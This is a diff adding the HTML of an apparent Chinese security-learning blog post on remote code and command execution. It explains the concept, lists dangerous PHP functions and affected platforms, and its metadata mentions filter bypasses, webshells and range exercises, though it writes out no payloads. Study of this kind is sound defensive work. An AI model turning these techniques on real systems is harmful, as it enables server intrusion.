@@ -1,0 +1,495 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>RCE代码及命令执行 | CCB</title><meta name="keywords" content="渗透测试"><meta name="author" content="ccb"><meta name="copyright" content="ccb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="RCE代码及命令执行"><meta name="application-name" content="RCE代码及命令执行"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="RCE代码及命令执行"><meta property="og:url" content="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><meta property="og:site_name" content="CCB"><meta property="og:description" content="RCE 代码及命令执行漏洞 remote command&amp;#x2F;code execute 分为远程命令执行和远程代码执行。 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="ccb"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="RCE 代码及命令执行漏洞 remote command&amp;#x2F;code execute 分为远程命令执行和远程代码执行。 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":true,"limitCount":50,"languages":{"author":"Author: ccb","link":"Link: ","source":"Source: CCB","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'CCB',
+  title: 'RCE代码及命令执行',
+  postAI: '',
+  pageFillDescription: 'RCE 代码及命令执行漏洞, 代码执行漏洞, 原理, 产生, 危害, 函数介绍, eval(), assert(), preg_replace(), call_user_func(), call_user_func_array(), array_ map(), 漏洞利用, 防御, 命令执行漏洞, 原理, 产生, 函数介绍, system(), exec(), passthru(), shell_exec(), popen(), proc_open(), pcntl_exec(), echo(), 防御, 绕过, 挖掘, 案例, 墨者靶场黑盒层 RCE 漏洞检测-公开漏洞, Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面, 一句话 Webshell 后门原理代码执行-拓展说明代码及命令执行漏洞分为远程命令执行和远程代码执行在应用中有时候程序员为了考虑灵活性简洁性会在代码调用代码或命令执行函数去处理比如当应用在调用一些能将字符串转化成代码的函数时没有考虑用户是否能控制这个字符串将造成代码执行漏洞同样调用系统命令处理将造成命令执行漏洞代码执行漏洞原理应用有时需要调用一些执行系统命令的函数如中的动态函数等当用户能控制这些函数中的参数时就可以将恶意系统命令拼接到正常命令中从而造成命令执行这就是命令执行漏洞以上函数主要也在中用的多实际上在正常应用中差别不太大用得最多的还是前三个产生源码中间件平台其他平台可以进一步参考中的漏洞危害执行任意代码向网站写控制整个网站甚至服务器例如获取服务器网络配置版本信息函数介绍函数把字符串按照代码来计算该字符串必须是合法的代码且必须以分号结尾如果没有在代码字符串中调用语句则返回如果代码中存在解析错误则函数返回在服务器上创建一下代码查看文件查看管理员添加管理员支持动态调用但是在之后的版本不支持动态调用此函数的作用是对一个字符串进行正则处理把第一参数作为回调函数调用回到函数并把第一个数组参数作为回到函数的参数为数组的每个元素应用回调函数漏洞利用一般找相应版本漏洞如一句话木马给语句加上了令其为变量可作为动态函数执行得到当前路径读文件的数据为写的数据为防御少用或禁用命令执行函数尽量少用执行命令的函数或者直接禁用能使用脚本解决的工作不要调用其他程序处理尽量少用执行命令的函数并在中禁用确保动态执行的函数为指定的函数在使用动态函数之前确保使用的函数是指定的函数之一参数用引号括起且进行过滤或固定在进入执行命令的函数方法之前对参数进行过滤对敏感字符进行转义参数的值尽量使用引号包裹并在拼接前调用进行转义对于可控点是程序参数的情况下使用函数进行过滤对于可控点是程序参数值的情况下使用函数进行过滤而针对由特定第三方组件引发的漏洞我们要做的就是及时打补丁修改安装时的默认配置对于函数一定要保证用户不能轻易接触的参数或者用正则严格判断输入的数据格式对于放弃使用修饰符如果必须要用修饰符请保证第二个参数中对于正则匹配出的对象用单引号包裹命令执行漏洞原理用户通过浏览器提交操作系统执行命令由于服务器端没有针对执行函数做过滤导致在没有指定绝对路径的情况下就执行命令可能会允许使用者通过改变或程序执行环境的其他方面来执行一个恶意构造的代码在操作系统中都可以作为命令连接符使用用户通过浏览器提交执行命令由于服务器端没有针对执行函数做过滤导致在没有指定绝对路径的情况下就执行命令只要满足第一个条件后面的条件就不再判断而要对所有的条件进行判断系统命令拼接管道符前面命令标准输出作为后面命令的标准输入先运行命令然后运行命令运行命令如果失败则运行命令运行命令如果成功则运行命令例题产生源码中间件平台其他环境函数介绍函数可以用来执行一个外部的应用程序并将相应的执行结果输出函数原型如下其中是要执行的命令存放执行命令的执行后的状态值函数可以用来执行一个外部的应用程序其中是要执行的命令是获得执行命令输出的每一行字符串存放执行命令后的状态值函数可以用来执行一个系统命令并显示原始的输出当系统命令的输出是二进制的数据并且需要直接返回值给浏览器时需要使用函数来替代与函数函数原型如下其中是要执行的命令存放执行命令后的状态值执行命令并返回输出的字符串函数原型如下其中是要执行的命令不返回执行结果而是返回一个文件指针在当前进程空间执行指定程序若代码中后跟的是反引号括起的内容则会将该内容作为代码执行并输出结果实际调用的将是以墨者学院代码分析溯源第题为例有一网站已知其源码内容如下由于存在解码和压缩函数因此在在线运行中跑一下得到执行结果其中的内容就是反引号括起的所以会存在代码执行然后进一步使用参数来进行命令执行看到该网站下有一个开头的文件查看该文件内容注意使用绕过对命令的过滤防御尽量不要使用命令执行函数客户端提交的变量在进入执行命令函数方法之前一定要做好过滤对敏感字符进行转义在使用动态函数之前确保使用的函数是指定的函数之一对语言来说不能完全控制的危险函数最好不要使用绕过绕过对空格的检查比如要替换掉空格且保持仍可执行改成加其他数字都行都能当作空格来用绕过关键词挖掘代码审计最主要的方式借助代码审计工具非常方便的审计出此类漏洞已知的漏洞已知的有很多每年都会爆出来很多此类的漏洞页面传参查找针对页面有传参的地方重点关注传入恶意代码尝试概率相对较低案例墨者靶场黑盒层漏洞检测公开漏洞未经身份验证的远程代码执行是基于的系统管理工具为了降低系统的管理难度有时候会对公司内的主机或系统预装了网页管理工具的漏洞存在于密码重置页面中该页面允许未经身份验证的用户通过简单的请求执行任意命令在注册界面提交后抓包将的改为修改密码的请求主体改为等参数其中使用参数作为命令执行的入口令这里所以输出了服务器的当前文件目录这里是直接在浏览器调试中修改的数据包然后令读取文件获得框架类漏洞漏洞层面远程代码执行漏洞复现漏洞检查工具版漏洞扫描工具工具参数说明批量扫描利用工具漏洞信息介绍显示工具版本地址指定漏洞名称漏洞名称详见批量扫描文件一行一个参数需要使用的使用填充页面编码默认编码代理格式为超时时间默认批量扫描进程数默认为个进程请求头格式为进入命令执行获取路径反弹地址格式为需要上传的文件路径和名称上传的目录和名称如关闭打印不存在漏洞的输出只保留存在漏洞的输出专业话语漏洞利用代码运行之后对目标进行攻击漏洞验证代码检测目标是否存在对应漏洞一句话后门原理代码执行拓展说明菜刀将操作系统的命令写入参数以方式传递给网站后门网站后门通过代码执行来执行系统命令或者代码从而达到了菜刀远程操作服务器的目的',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-06 17:09:05',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="CCB" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CCB</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 1.05rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">August 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">15</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">July 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/08/"><span class="card-archive-list-date">August 2021</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">August 2020</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">RCE代码及命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.979Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><header><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">RCE代码及命令执行</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">ccb</span><time itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><time itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.979Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></header><h1 id="RCE-代码及命令执行漏洞"><a href="#RCE-代码及命令执行漏洞" class="headerlink" title="RCE 代码及命令执行漏洞"></a>RCE 代码及命令执行漏洞</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png" alt="RCE.png"></p>
+<p><strong>remote command&#x2F;code execute</strong> 分为<strong>远程命令执行</strong>和<strong>远程代码执行</strong>。</p>
+<p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用<u>代码或命令执行函数</u>去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
+<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的<strong>system</strong>、<strong>exec</strong>、<strong>assert</strong>、<strong>eval</strong>、<strong>preg_replace</strong>、<strong>shell_exec</strong>、<strong>passthru</strong>、<strong>popen</strong>、<strong>proc_popen</strong>、<strong>escapeshellcmd</strong>、<strong>pcntl_exec</strong>、<strong>call_user_func</strong>、<strong>call_user_func_array</strong>、<strong>array_map</strong>、<strong>动态函数</strong> 等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。</p>
+<p>以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。</p>
+<h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：thinkphp、eyoucms、wordpress</p>
+<p><strong>中间件平台</strong>：tomcat、struts2、redis</p>
+<p><strong>其他平台</strong>：php-cgi、jenkins-cl、java-RMI</p>
+<p>可以进一步参考vulhub中的漏洞。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>执行任意代码</li>
+<li>向网站写WebShell</li>
+<li>控制整个网站甚至服务器</li>
+</ul>
+<p>例如获取服务器网络配置、php版本信息：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103952499.png" alt="image-20220804103952499"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804104032041.png" alt="image-20220804104032041"></p>
